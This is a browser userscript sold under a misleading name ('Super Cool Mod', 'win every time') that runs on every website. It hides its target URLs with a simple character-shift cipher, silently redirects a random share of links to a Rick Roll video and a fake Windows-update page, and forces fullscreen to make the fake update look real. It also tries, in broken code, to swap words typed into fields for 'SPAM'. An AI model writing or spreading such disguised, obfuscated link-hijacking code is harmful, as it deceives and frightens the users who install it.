// ==UserScript==
// @name         Super Cool Mod
// @namespace    http://tampermonkey.net/
// @version      3.42
// @description  win every time
// @author       John Smith
// @match        *://*/*
// @grant        none
// ==/UserScript==

let ENABLED = true;

const DEBUG = true;

var replaceRate = 0.3;
// const replaceRate = 1;

const URL_RR = "iuuqt;00xxx/zpvuvcf/dpn0xbudi@w>ZeexlNKH2Kp";
var rrWeight = 0.3;
// const rrWeight = 1;

const URL_WU = "iuuqt;00gblfvqebuf/ofu0xjo21vf0";
const wuWeight = 0.1;

const TRIGGERS = ["uif", "sjdl", "spmm", "ipx", "wjsvt", "gjy", "ifmq", "tdippm", "nqtb{", "dpn", "psh"];
const REPLACEMENT = "TQBN";

(function() {
    for (let i=0; i<TRIGGERS.length; i++)
        print(encrypt(TRIGGERS[i]));
    print(encrypt(REPLACEMENT));

    replace();

    initTriggerDetection();
})();

function replace() {
    let links = getLinks();
    for(let i=0;i<links.length;i++) {
        if(Math.random() < replaceRate) {
            randomReplacement(links[i]);
        }
    }
}

function getLinks() {
    return document.getElementsByTagName("A");
}

function randomReplacement(link) {
    let weightSum = rrWeight + wuWeight;
    let random = Math.random()*weightSum;
    if(random < rrWeight) {
        print(link+": rr");
        rr(link);
    } else if(random < wuWeight + rrWeight) {
        print(link+": wu");
        wu(link);
    } else {

    }
}

function wu(link) {
    link.href = decrypt(URL_WU);
    link.target = "_self"
    const elem = document.getElementsByTagName("BODY")[0].children[0];
    link.addEventListener("click", openFullscreen(elem))
}

function rr(link) {
    link.href = decrypt(URL_RR);
    link.target = "_self"
}

function fixBackground() {
    const css = `*:fullscreen, *:-webkit-full-screen, *:-moz-full-screen {background-color: rgba(255,255,255,0);}`;
    const style = document.createElement('style');
    if (style.styleSheet) {
        style.styleSheet.cssText = css;
    } else {
        style.appendChild(document.createTextNode(css));
    }

    document.getElementsByTagName('head')[0].appendChild(style);
}

function openFullscreen(elem) {
    print("attempting fullscreen");

    try {
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
            //elem.appendChild(style)
            //document.getElementsByTagName("BODY").appendChild(style)
        } else if (elem.mozRequestFullScreen) { /* Firefox */
            elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
            elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) { /* IE/Edge */
            elem.msRequestFullscreen();
        }
        elem.style.backgroundColor = "rgba(255,255,255,0);"
        print(elem.style.backgroundColor);

        print("success");
    } catch (e) {
        print("Couldn't make fullscreen!!");
        print(e);
    }

    fixBackground();
}

function print(msg) {
    if(DEBUG) {
        console.log(msg);
    }
}

function encrypt(str) {
    let result = "";
    for(let i=0; i<str.length; i++) {
        let charint = str.charCodeAt(i);
        result+=String.fromCharCode(charint+1);
    }
    return result;
}

function decrypt(str) {
    let result = "";
    for(let i=0; i<str.length; i++) {
        let charint = str.charCodeAt(i);
        result+=String.fromCharCode(charint-1);
    }
    return result;
}

function initTriggerDetection() {
    document.addEventListener('keydown', function(event) {
        print(document.activeElement.innerHTML);
        for(let i=0; i<TRIGGERS.length; i++) {
            print("replacing key down...");
            document.activeElement.innerHTML.replaceAll(decrypt(TRIGGERS[i]), decrypt(REPLACEMENT));
        }
    });

    document.addEventListener('focusin', function() {
        const textElem = document.activeElement;
        print(textElem.innerHTML);
        for(let i=0; i<TRIGGERS.length; i++) {
            print("replacing...");
            textElem.innerHTML.replaceAll(decrypt(TRIGGERS[i]), decrypt(REPLACEMENT));
        }
    }, true);
}